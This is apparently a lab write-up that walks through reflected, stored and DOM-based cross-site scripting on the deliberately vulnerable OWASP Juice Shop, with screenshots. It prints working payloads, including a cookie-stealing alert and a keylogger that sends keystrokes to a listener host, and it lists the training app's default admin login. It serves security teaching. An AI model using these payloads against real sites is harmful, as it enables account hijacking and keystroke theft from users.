<h1> XSS on Juice Shop
</h1>




For this lab We're going to find a real input field on Juice Shop that reflects our input unsanitized, inject JavaScript that runs in the browser, and pop an alert showing a stolen session cookie, exactly what real attackers do to hijack accounts. 
<br />
<h2> What's covered:</h2>

- Payload in URL, bounces back, only the victim who clicks the link.
- Payload saved in the database for every user who visits the page. 

- Payload in URL fragment, JS processes it for the victim who clicks the link.

<br />


<h2>Spinning up the lab:
Find the Vulnerable Search Bar (Reflected XSS)
</h2>

- Juice Shop's search bar is vulnerable to reflected XSS
- Click the search icon at the top of the page and try a normal search like "Apples


<br />
<br />
<img src="https://imgur.com/06lTGEx.jpg"  height="80%" width="80%">

<br />

- Notice the URL becomes (http://10.10.30.131:3000/#/search?q=apple)
- And the page also  shows "Search Results for apple. Your input reflects  on the screen.
That reflection is the vulnerability.

<br />
<img src="https://imgur.com/oRxzayQ.jpg"  height="80%" width="80%">
<br />
<br />

<br />
<br />

- Now in the search box type ( <iframe src="javascript:alert('XSS')"> )
- You should see a popup alert box appear on screen 


<br />

<img src="https://imgur.com/uBLzilT.jpg"  height="80%" width="80%">
<br />

-  log into Juice Shop with any account.
-  Email (admin@juice-sh.op)
-  Password (admin123)

<br />
<img src="https://imgur.com/fagBqXF.jpg"  height="80%" width="80%">
<br />

-  After logging in, search for this payload using this command in the vulnerable search bar  ( <iframe src="javascript:alert(document.cookie)"> )
-  The app's session credential. In a real attack, this gets sent to the attacker's server instead of just being displayed.
  
<br />
<img src="https://imgur.com/cb8lESG.jpg"  height="80%" width="80%">
<br/>
<h1> Reflected XSS only hits the person who clicks the link. Stored XSS gets saved to the database and hits every user who visits the page.
</h1>

- Go to the product reviews section, click any product, and scroll down to the reviews section. 
- In the review box type ( <script>alert('Stored XSS')</script> ) and  submit the review. 
- Every time anyone views this product, the script fires in their browser.

<br />
<br />
<img src="https://imgur.com/STB5YfF.jpg"  height="80%" width="80%">
<img src="https://imgur.com/LFsfefk.jpg"  height="80%" width="80%">
<br />

- DOM Based XSS, this never touches the server; the vulnerability lives entirely in the frontend JavaScript code.
- Go to this URL directly, your ipaddress should be different from mine ( http://10.10.30.131:3000/#/search?q=<script>alert('DOM XSS')</script> ).
- DOM XSS is hardest to detect because server side scanners never see the payload,  it lives in the URL fragment (#), which browsers don't send to the server.
- Keylogger via XSS makes XSS truly dangerous. Paste this in the search bar ( <iframe src="javascript:
  document.onkeypress=function(e){
    new Image().src='http://10.10.30.131:8000/?k='+e.key
  }"> )
- Then, on your Kali machine, start a listener

<br />
<br/>
<img src="https://imgur.com/N4wmVF8.jpg"  height="80%" width="80%">
<img src="https://imgur.com/7atwv5K.jpg"  height="80%" width="80%">
<img src="https://imgur.com/657wVnI.jpg"  height="80%" width="80%">
<br />



<br />
<br/>
<br />
<br />
